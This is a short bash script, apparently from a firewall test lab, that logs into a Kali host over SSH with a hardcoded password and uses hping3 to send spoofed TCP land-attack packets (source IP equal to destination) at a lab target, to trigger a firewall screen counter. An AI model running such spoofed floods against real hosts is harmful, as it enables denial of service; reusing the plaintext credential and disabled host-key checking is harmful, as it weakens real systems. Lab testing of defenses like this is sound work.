#!/bin/bash
# TCP Land Attack: source IP spoofed to equal destination IP
# Triggers: TCP land attack SCREEN

SSH_OPTS="-o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc,aes128-cbc"
KALI="100.123.38.1"
TARGET="192.168.20.2"
COUNT=${1:-100}

echo "=== TCP Land Attack ==="
echo "Attacker : Kali (192.168.10.2)"
echo "Target   : Linux (${TARGET})"
echo "Packets  : ${COUNT}"
echo "Triggers : TCP land attack SCREEN (src IP = dst IP)"
echo ""
echo "Sending land attack packets (src=${TARGET}, dst=${TARGET})..."

sshpass -p 'Juniper!1' ssh $SSH_OPTS jcluser@$KALI \
    "sudo /usr/sbin/hping3 -S -a ${TARGET} -p 80 -c ${COUNT} ${TARGET} 2>&1" 2>/dev/null

echo ""
echo "Attack complete. Check monitor.sh for land attack SCREEN hit counters."
